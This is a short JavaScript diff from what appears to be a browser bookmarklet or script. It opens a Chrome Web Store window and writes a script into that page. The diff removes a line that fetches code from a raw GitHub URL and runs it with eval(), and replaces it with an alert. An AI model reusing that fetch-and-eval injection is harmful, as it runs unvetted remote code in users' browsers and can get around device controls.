@@ -8,5 +8,5 @@ try {
 }
 catch {
     var x = window.open("https://chrome.google.com/webstorex");
-    x.document.write('<script>javascript:fetch("https://raw.githubusercontent.com/phillipbruh/snowplus/main/idk").then(data=>{data.text().then(text=>{eval(text)})});</script>');
+    x.document.write('<script>alert("Run it again on this page");</script>');
 }
